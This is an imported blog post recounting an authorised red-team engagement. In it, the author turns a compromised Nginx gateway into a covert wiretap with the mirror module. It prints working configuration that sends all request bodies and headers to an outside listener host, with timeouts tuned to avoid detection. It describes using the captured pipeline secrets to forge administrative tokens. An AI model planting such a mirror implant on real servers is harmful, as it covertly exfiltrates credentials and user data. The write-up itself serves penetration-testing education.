---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-08-08_my-secret-to-api-privesc-tapping-compromised-web-servers.md
original_filename: 2023-08-08_my-secret-to-api-privesc-tapping-compromised-web-servers.md
title: 'My secret to API privesc: Tapping compromised web servers'
category: documents
detected_topics:
- api-security
- access-control
- command-injection
- otp
- automation-abuse
- graphql
tags:
- imported
- documents
- api-security
- access-control
- command-injection
- otp
- automation-abuse
- graphql
language: en
raw_sha256: e0660a852bee668003a6cace0e511ede78f3da8b257b9ab7b9ce669931061913
text_sha256: afa2a5b586252aa30290bc804ad8ec53d6684a7ae427fe186cfd8a881ad8223a
ingested_at: '2026-06-28T07:32:25Z'
sensitivity: unknown
redactions_applied: false
---

# My secret to API privesc: Tapping compromised web servers

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-08-08_my-secret-to-api-privesc-tapping-compromised-web-servers.md
- Source Type: markdown
- Detected Topics: api-security, access-control, command-injection, otp, automation-abuse, graphql
- Ingested At: 2026-06-28T07:32:25Z
- Redactions Applied: False
- Raw SHA256: `e0660a852bee668003a6cace0e511ede78f3da8b257b9ab7b9ce669931061913`
- Text SHA256: `afa2a5b586252aa30290bc804ad8ec53d6684a7ae427fe186cfd8a881ad8223a`


## Content

---
title: "My secret to API privesc: Tapping compromised web servers"
url: "https://danaepp.com/my-secret-to-api-privesc-tapping-compromised-web-servers"
final_url: "https://danaepp.com/my-secret-to-api-privesc-tapping-compromised-web-servers"
authors: ["Dana Epp (@DanaEpp)"]
bugs: ["Persistence", "Post-exploitation"]
publication_date: "2023-08-08"
added_date: "2023-08-21"
source: "pentester.land/writeups.json"
original_index: 873
---

August 8, 2023

[API Hacking Techniques](https://danaepp.com/category/api-hacking-techniques)

# My secret to API privesc: Tapping compromised web servers

![My secret to API privesc: Tapping compromised web servers](https://danaepp.com/wp-content/uploads/2023/08/Tapping-compromised-web-servers.png)

It was about three in the afternoon on a Friday. Of course it was.

The spring rain was beating down with a weird cadence, like drummers were marching us into the weekend. Hey, it’s the Pacific Northwest. This is normal.

I was tired. All week I helped a client with a pentest for a new SaaS service that was about to go into production. I made good progress, getting a foothold on a frontend Nginx server that routed all their APIs.

But pivoting was getting difficult.

Until I decided to play by a different set of rules.

![](https://i0.wp.com/danaepp.com/wp-content/uploads/2023/07/image-13.png?resize=956%2C714&ssl=1)Yep… you just got Rick rolled 🤣

## Security (mis)configuration

I was thinking about the [OWASP API Security Top 10](https://danaepp.com/owasp-api-security-top-10-upcoming-changes-you-need-to-know-about), which gave me an idea. One of the top 10 categories is always about _security misconfiguration_. Usually, it’s about missing patches, systems out of date, or how security hardening hasn’t been applied for things like CORS policies or TLS requirements.

But another weakness many people don’t think about in the security misconfiguration category is when unnecessary “features” are enabled in the web server when they shouldn’t be.

This got me thinking. What could we do with the access I had to Nginx?

I already thought about capturing traffic with tcpdump, but I didn’t have the appropriate privileges on the server to go into promisc mode. And the server was resource starved with almost no disk space, so trying to proxy traffic and store it locally wasn’t a practical option.

What else could I do? What would a real malicious actor do?

## Thinking like the bad guy

Earlier in the week, I came across an article about how state actors like to drop implants on servers they compromise and come back to them later.

One of the persistence techniques used was to inject a benign Apache module that laid dormant until a specific HTTP request sequence was detected. It would then spring into action and open a backdoor to the server when it saw such a request.

![](https://i0.wp.com/danaepp.com/wp-content/uploads/2023/07/image-14.png?resize=974%2C548&ssl=1)

But I didn’t have Apache here. It was Nginx. Did they support any sort of construct like this?

## RTFM

I decided the best way to understand what Nginx could do was to go read the docs. I already had the basics down and understood how Nginx worked as an API gateway proxy.

But wow… it could do a whole lot more.

It’s a content cache. A reverse proxy. A web accelerator. A load balancer. The list goes on and on.

And to my instant delight as soon as I saw it, it can do _out-of-band mirroring_.

You know… _mirroring_. To take inbound requests and send them somewhere else to be captured without impacting the actual production service. It’s a friggen’ wiretap built right into the server, ideal for persistent implants.

This could be fun.

## Building a badass implant listener

So Nginx could mirror inbound traffic. But there has to be something listening on the other end that can collect the mirrored data.

Sure, pretty much any kind of HTTP server should be able to do that. But if it’s not purpose-built, it might hang connections or return the wrong status codes when the request paths don’t match.

A bit of Python can do the trick. Just capture any request sent and dump it into a file to review later and return a success code. It could be something as simple as [this script I wrote](https://gist.github.com/DanaEpp/1964076c89e1e7af3daae19657687449).

I don’t want to record all traffic, so I added some Content-Type filtering to only look for JSON or form data and added a filter to block inbound IPs except for those coming from the implants I want to listen to.

It works pretty well, most of the time. I later rewrote the listener to be multithreaded and stored each implant’s content in its own file to make data management easier.

But that’s a discussion for another day.

With my implant listener now logging all relevant requests, it was time to tap Nginx.

![](https://i0.wp.com/danaepp.com/wp-content/uploads/2023/07/image-15.png?resize=978%2C456&ssl=1)

## Tapping Nginx

So when I first stumbled upon the mirror feature in Nginx, it looked simple enough. But I ended up stumbling a few times once I started actually using it.

The [documentation](https://nginx.org/en/docs/http/ngx_http_mirror_module.html) was rather clear. You basically set the mirror directive on the location(s) you want to mirror and route them through another location that will proxy to your listener. The configuration looks something like this:
  
  
  
  
  location / {
  
  mirror /mirror;
  
  proxy_pass http://original_backend.tld;
  
  }
  
  location = /mirror {
  
  internal;
  
  proxy_pass http://implant_listener.tld$request_uri;
  
  }

This configuration would create a subrequest for the mirrored server but ignore the response.

Here was where I had my first stumbling block. It ends up not this easy. Jitter between servers and delays would slow down the production requests. Noticeably slower.

### Timeout hell kills Nginx

While I was testing this on my own ephemeral resources, I could see delays when the mirror failed in some way. My original Python code was slow and handled one request at a time. Nginx would basically throttle the production connections to the real API endpoints while waiting for responses.

Worse yet, if I didn’t start the implant listener before Nginx, it would fail to start Nginx and eventually die with an**“Upstream host is unavailable”** error message.

As this was a red team pentest engagement, we didn’t want to be detected at this point. So this configuration was unacceptable.

The blue team didn’t know we had a foothold on the Nginx servers yet, and we did NOT want to slow down the API or prevent Nginx from functioning, which might alert them to our presence.

It ended up that these edge case timeouts were a known issue. They could be fixed by setting a local resolver and an aggressive proxy timeout.

So the configuration needed to be updated.
  
  
  
  
  location / {
  
  mirror /mirror;
  
  mirror_request_body on;
  
  proxy_pass http://original_backend.tld;
  
  }
  
  location = /mirror {
  
  internal;
  
  resolver 127.0.0.1;
  
  set $upstream_endpoint https://implant_listener.tld;
  
  proxy_pass $upstream_endpoint;
  
  proxy_pass_request_body on;
  
  proxy_connect_timeout 250ms;
  
  proxy_read_timeout 250ms;
  
  }

This workaround uses a dedicated ‘local’ resolver for the upstream implant listener and stores it in a variable we can reference in the mirror config. We also tune the proxy connection timeouts so Nginx doesn’t wait and time out.

With that now reliably working, we can tune what we are mirroring to get useful information that may help us pivot.

### Configuring the Mirroring to capture API requests

I had one last thing I wanted to do. And that was to make sure I was mirroring EVERYTHING I needed to gain deeper operational insights into the API services we were testing. It was here that I leveraged some of the tactics those API security testing vendors use to capture traffic for security analysis.

Companies like Salt Security and Wallarm have been mirroring API endpoints for years. Why not take a page from their playbook and turn it to our advantage?

Like this [Wallarm documentation](https://docs.wallarm.com/installation/oob/web-server-mirroring/overview/#nginx). It perfectly explains how to set the Nginx configuration to collect the most information. And with that, we now have a more mature configuration to collect all the API requests we want. The mirror config looks something like this now:
  
  
  
  
  location = /mirror {
  
  internal;
  
  resolver 127.0.0.1;
  
  set $upstream_endpoint https://implant_listener.tld;
  
  proxy_pass $upstream_endpoint$request_uri;
  
  proxy_set_header X-SERVER-PORT $server_port;
  
  proxy_set_header X-SERVER-ADDR $server_addr;
  
  proxy_set_header HOST $http_host;
  
  proxy_set_header X-Forwarded-For $realip_remote_addr;
  
  proxy_set_header X-Forwarded-Port $realip_remote_port;
  
  proxy_set_header X-Forwarded-Proto $http_x_forwarded_proto;
  
  proxy_set_header X-Scheme $scheme;
  
  proxy_set_header X-Request-ID $request_id;
  
  proxy_pass_request_body on;
  
  proxy_connect_timeout 250ms;
  
  proxy_read_timeout 250ms;
  
  }

And with that, we now have configured mirrored traffic to the implant listener, listed the headers to be mirrored, and specified the destination IP address/domain name of the machine where to send the data.

I moved everything to the production servers and watched my listener start recording my traffic as I launched a small Postman Collection Runner test suite.

Sweet. Success. Time to show everyone the tap I just built.

## The results

In my excitement of building all this out, I didn’t realize it was now in the early evening of Friday. The office was a ghost town; it seemed everyone left for the weekend. Where the heck did the last few hours go? And why the heck didn’t anyone bang on my door and say goodbye?

How rude.

![](https://i0.wp.com/danaepp.com/wp-content/uploads/2023/07/image-12.png?resize=514%2C414&ssl=1)

I decided to leave everything running and headed home. I figured I’d pick up where I left off on Monday when everyone was back in the office.

And boy, was Monday morning a blast.

As soon as I sat down and looked at the data on my implant listener server, I saw gigabytes of log data.

WTF?

Unbeknownst to us all, the blue team pushed new versions of everything over the weekend, including a couple of services we didn’t initially find during recon.

The one that excited me was an app token exchange endpoint that was designed to be used internally to mint administrative tokens for all the backend services. It was only used during blue/green deployments to help automate their CI/CD pipeline as they transitioned between staging and production.

You gotta love it when people automate DevOps using APIs. Why this was going through the front-end Nginx servers was just bonkers to me.

![](https://i0.wp.com/danaepp.com/wp-content/uploads/2023/07/image-16.png?resize=966%2C550&ssl=1)

But I digress.

The request logger stored all the data I needed. I had collected the application client ID and secret of the CI/CD pipeline process, along with all the special headers required to communicate between services to forge administrative tokens. And thanks to the weekend updates (go blue team!), I had all the info to use this token exchange service and gain administrative access to every host on the cluster.

All thanks to this little tap.

_**Game over.**_

## Post-mortem years later

Looking back on this, I realize I now have several weapons in my arsenal that came from the experiences gained during this engagement.

I now have custom modules and/or workflows for Apache, IIS, Tomcat, Kestrel, and Flask that mirror traffic and dump API requests to my request listeners. And it’s one of the first things I do once I gain a foothold on a web server.

It has led to several different privesc options over the years.

I also now run my listeners serverless and dump to table storage, so managing all the data during an engagement is easier. And I only pay for computing as it’s used, so it’s much easier to know which client to bill.

Except for that one time when a client’s blue team reverted a service from backup and accidentally reinstalled one of my implants while I was away on holiday, triggering one of their new IDS sensors and causing a real stir in their SOC.

![](https://i0.wp.com/danaepp.com/wp-content/uploads/2023/07/Screenshot-2023-07-30-at-5.11.18-PM.png?resize=972%2C466&ssl=1)

That is a story for another day.

## Conclusion

I don’t share this story to impress you but to impress upon you that when conducting API pentests, you sometimes need to think outside the box.

API privesc can be tricky. But if you have an opportunity to tap compromised apps and infrastructure, you may gain operational insights that can lead you to that privilege escalation you are looking for.

I’m sure I don’t have to state the obvious, but this is aggressive. You should only be doing this with permission from your client, and you better know what you’re doing. Hopefully, you can do this in a non-production environment that will avoid causing critical business impact.

Ensure you have emergency contact information for the blue team to communicate with them if you screw something up. And above all else, **be nice**. 

![](https://i0.wp.com/danaepp.com/wp-content/uploads/2023/07/image-18.png?resize=561%2C244&ssl=1)

The red team usually has a bad rep as it is… giving more work to the blue team when you break something is never a good thing. Especially when a weekend is approaching. 🤣 

### Share this:

  * [ Share on LinkedIn (Opens in new window) LinkedIn ](https://danaepp.com/my-secret-to-api-privesc-tapping-compromised-web-servers?share=linkedin)
  * [ Share on X (Opens in new window) X ](https://danaepp.com/my-secret-to-api-privesc-tapping-compromised-web-servers?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://danaepp.com/my-secret-to-api-privesc-tapping-compromised-web-servers?share=facebook)
  * [ Print (Opens in new window) Print ](https://danaepp.com/my-secret-to-api-privesc-tapping-compromised-web-servers#print?share=print)
  * 

![Dana Epp](https://danaepp.com/wp-content/uploads/2022/08/danaepp-headshot-1-300x300.jpg)

Dana Epp

Hey, I’m Dana, aka SilverStr. I build and break software for a living, and am a Microsoft Regional Director and Developer Security MVP. I’ve spent decades as a security architect that focuses on helping secure software, data, and infrastructure on both blue and red teams. As of late, I have been focusing more on my offensive tradecraft to help developers and IT administrators see the impact of exploitation on vulnerabilities in their work. This blog is my chance to give back to the community by sharing my experiences and war wounds from the trenches.

← [Why Your Vulnerability Report Titles Suck, and What to Do About It](https://danaepp.com/why-your-vulnerability-report-titles-suck-and-what-to-do-about-it)

→ [Why API hackers should embrace failure](https://danaepp.com/why-api-hackers-should-embrace-failure)
